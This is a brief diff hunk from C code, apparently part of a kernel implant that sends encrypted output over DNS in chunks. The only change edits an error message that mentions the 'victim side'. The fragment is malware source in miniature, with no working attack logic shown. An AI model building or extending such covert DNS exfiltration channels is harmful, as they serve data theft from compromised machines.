@@ -154,7 +154,7 @@ int dns_send_data(const char *data, size_t data_len) {
     // Too many chunks, refuse to send, arbitrarily limit to DNS_MAX_AUTHORIZED_NB_CHUNKS
     if (total_chunks > DNS_MAX_AUTHORIZED_NB_CHUNKS) {
         kfree(encrypted_msg);
-        dns_send_data("Output on victim side too big. Use TCP instead", 47);
+        dns_send_data("Output on victim side too big. Use TCP instead. ", 47);
         return -E2BIG;
     }
 
